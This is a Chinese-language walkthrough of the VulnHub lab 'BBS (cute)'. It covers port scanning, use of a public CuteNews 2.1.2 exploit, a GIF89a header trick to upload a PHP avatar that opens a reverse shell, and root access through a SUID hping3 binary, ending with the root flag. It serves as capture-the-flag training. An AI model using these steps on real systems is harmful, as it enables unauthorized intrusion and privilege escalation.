# BBS (cute): 1.0.2

2024-5-19 https://www.vulnhub.com/entry/bbs-cute-101,567/

difficulty: Easy->Intermediate

## IP

192.168.5.22

## Scan

Open Port -> 22,80,88,110,995

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 04d06ec4ba4a315a6fb3eeb81bed5ab7 (RSA)
|   256 24b3df010bcac2ab2ee949b058086afa (ECDSA)
|_  256 6ac4356a7a1e7e51855b815c7c744984 (ED25519)
80/tcp  open  http     Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
88/tcp  open  http     nginx 1.14.2
|_http-title: 404 Not Found
|_http-server-header: nginx/1.14.2
110/tcp open  pop3     Courier pop3d
|_pop3-capabilities: IMPLEMENTATION(Courier Mail Server) UTF8(USER) TOP UIDL USER LOGIN-DELAY(10) PIPELINING STLS
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-09-17T16:28:06
|_Not valid after:  2021-09-17T16:28:06
|_ssl-date: TLS randomness does not represent time
995/tcp open  ssl/pop3 Courier pop3d
|_pop3-capabilities: IMPLEMENTATION(Courier Mail Server) TOP UTF8(USER) USER UIDL PIPELINING LOGIN-DELAY(10)
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-09-17T16:28:06
|_Not valid after:  2021-09-17T16:28:06
|_ssl-date: TLS randomness does not represent time
```

有 2 个 web 服务，也有 pop3 邮件服务，但是我们没有邮件服务的账号和密码，进入不到 pop3，只有先看看 web 服务上有什么信息了。

web 目录扫描，88 端口的 nginx 上，没有目录暴露出来。

80 对应的 apache 上有一些页面：

```
http://192.168.5.22/docs                 (Status: 301) [Size: 311] [--> http://192.168.5.22/docs/]
http://192.168.5.22/index.html           (Status: 200) [Size: 10701]
http://192.168.5.22/uploads              (Status: 301) [Size: 314] [--> http://192.168.5.22/uploads/]
http://192.168.5.22/search.php           (Status: 200) [Size: 5246]
http://192.168.5.22/print.php            (Status: 200) [Size: 28]
http://192.168.5.22/rss.php              (Status: 200) [Size: 105]
http://192.168.5.22/index.php            (Status: 200) [Size: 6175]
http://192.168.5.22/skins                (Status: 301) [Size: 312] [--> http://192.168.5.22/skins/]
http://192.168.5.22/core                 (Status: 301) [Size: 311] [--> http://192.168.5.22/core/]
http://192.168.5.22/manual               (Status: 301) [Size: 313] [--> http://192.168.5.22/manual/]
http://192.168.5.22/popup.php            (Status: 200) [Size: 28]
http://192.168.5.22/captcha.php          (Status: 200) [Size: 94]
http://192.168.5.22/LICENSE.txt          (Status: 200) [Size: 3119]
http://192.168.5.22/example.php          (Status: 200) [Size: 9522]
http://192.168.5.22/libs                 (Status: 301) [Size: 311] [--> http://192.168.5.22/libs/]
http://192.168.5.22/snippet.php          (Status: 200) [Size: 0]
http://192.168.5.22/show_news.php        (Status: 200) [Size: 2987]
http://192.168.5.22/cdata                (Status: 301) [Size: 312] [--> http://192.168.5.22/cdata/]
http://192.168.5.22/show_archives.php    (Status: 200) [Size: 0]
```

http://192.168.5.22/index.php 发现了一个登录页面，页面底部看到 CMS 的版本为 Powered by CuteNews 2.1.2

经过 searchsploit 找到了一个对应版本的 exp https://www.exploit-db.com/exploits/48800 ，下载到 kali 进行尝试利用。

http://192.168.5.22/index.php?register 这个页面是注册页面，注册一个 test 用户，http://192.168.5.22/captcha.php访问这个注册码，然后填进去。

注册用户凭据 test:test ，然后登陆，在http://192.168.5.22/index.php?mod=main页面修改头像，如果直接上传会通不过验证提示图片错误，根据漏洞描述，后台验证了文件头，这里我们用BP进行抓包拦截，在file头部加上GIF89a ，来绕过后台的验证限制。

如果是使用的 https://www.exploit-db.com/exploits/48800 中的 exp，需要将 python 代码中的 /CuteNews 全部删除，因为这个靶场的 web 根目录就是在/var/www/html，没有在 CuteNews 目录中。

右键点击头像，复制链接，找到了图片的地址，http://cute.calipendula/uploads/avatar_test_8888.php

在 kali 上监听 8888 端口，然后访问上面这个网址 curl http://192.168.5.22/uploads/avatar_test_8888.php ，就得到了反弹的 shell。

进行系统枚举，sudo -l :

```
(root) NOPASSWD: /usr/sbin/hping3 --icmp
```

但是在使用 sudo hping3 时，还是提示输入密码。

查找 suid，发现 /usr/sbin/hping3 也是 suid 程序，所以直接利用， 进行提权：

```
www-data@cute:/var/www/html$ /usr/sbin/hping3
hping3> id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
hping3> cd /root
hping3> ls
localweb  root.txt
hping3> cat root.txt
0b18032c2d06d9e738ede9bc24795ff2
```
